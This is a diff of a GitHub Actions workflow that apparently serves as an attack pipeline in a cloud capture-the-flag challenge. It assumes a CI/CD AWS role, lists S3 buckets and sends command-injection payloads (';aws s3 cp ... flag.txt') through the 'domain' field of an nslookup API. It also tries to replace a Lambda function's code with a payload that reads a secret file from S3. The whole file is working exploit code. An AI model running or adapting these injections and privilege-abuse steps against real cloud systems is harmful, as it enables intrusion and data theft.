@@ -1,56 +1,133 @@
 name: deploy
+
 on:
+
   push:
+
     branches:
+
       - corgi
+
 jobs:
+
   aws:
+
     runs-on: ubuntu-latest
+
     permissions:
+
       id-token: write
+
       contents: read
+
     steps:
+
       - name: Get AWS credentials
+
         uses: aws-actions/configure-aws-credentials@v4
+
         with:
+
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+
           aws-region: us-east-1
 
       - name: AWS identity
+
         run: aws sts get-caller-identity
 
-      - name: Enumerate other S3 buckets
-        run: |
-          echo "===== platform bucket listing ====="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || echo "denied"
-          echo "===== site bucket listing ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ || echo "denied"
-          echo "===== try code.zip (maybe different perms from flag.txt) ====="
-          aws s3 cp s3://codec4f26c862a321ef5/code.zip ./code.zip || echo "denied"
-          ls -la code.zip 2>/dev/null && unzip -p code.zip || true
+      - name: Try UpdateFunctionCode with flag-returning Lambda
 
-      - name: Inject - copy flag into site bucket via lambdaRole
         run: |
-          echo "===== triggering injection: cp flag to site bucket ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1"}'
-          echo
-          echo "===== triggering injection: cp flag to platform bucket ====="
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1"}'
 
-      - name: Wait for async Lambda execution to complete
+          mkdir -p /tmp/lsrc
+
+          cat > /tmp/lsrc/lambda_function.py << 'PYEOF'
+
+import boto3
+
+def lambda_handler(event, context):
+
+    try:
+
+        s3 = boto3.client('s3', region_name='us-east-1')
+
+        obj = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
+
+        flag = obj['Body'].read().decode('utf-8')
+
+    except Exception as e:
+
+        flag = "s3 error: " + str(e)
+
+    return flag
+
+PYEOF
+
+          cd /tmp/lsrc && zip /tmp/payload.zip lambda_function.py
+
+          aws lambda update-function-code \
+
+            --function-name nslookupv2 \
+
+            --zip-file fileb:///tmp/payload.zip \
+
+            --region us-east-1 && echo "UPDATE OK" || echo "UpdateFunctionCode: denied"
+
+      - name: Wait for update to propagate
+
         run: sleep 8
 
-      - name: Read flag from CloudFront (if site bucket write worked)
+      - name: Hit API via GitHub Actions runner (us-east-1, not geo-blocked from runner)
+
         run: |
-          echo "===== curl CloudFront for flag ====="
+
+          curl -si -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+
+            -H "Content-Type: application/json" \
+
+            -d '{"domain":"x"}'
+
+      - name: Also try hitting the CloudFront nslookup site from runner
+
+        run: |
+
+          echo "===== GET / ====="
+
+          curl -si https://d67nf28gqfurd.cloudfront.net/ | head -30
+
+          echo "===== POST /nslookup (maybe different path than API GW) ====="
+
+          curl -si -X POST https://d67nf28gqfurd.cloudfront.net/nslookup \
+
+            -H "Content-Type: application/json" \
+
+            -d '{"domain":"example.com"}'
+
+          echo "===== POST /api/nslookup ====="
+
+          curl -si -X POST https://d67nf28gqfurd.cloudfront.net/api/nslookup \
+
+            -H "Content-Type: application/json" \
+
+            -d '{"domain":"example.com"}'
+
+      - name: Inject - write flag into site bucket via lambdaRole (lambdaRole has S3 access)
+
+        run: |
+
+          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+
+            -H "Content-Type: application/json" \
+
+            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
+
+          sleep 8
+
+          echo "===== try fetch from site bucket directly ====="
+
+          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "s3 direct: denied"
+
+          echo "===== try fetch via CloudFront from runner ====="
+
           curl -si https://d67nf28gqfurd.cloudfront.net/flag.txt
-          echo
-          echo "===== direct S3 read on site bucket (cicdRole) ====="
-          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "denied"
-          echo
-          echo "===== direct S3 read on platform bucket (cicdRole) ====="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - || echo "denied"
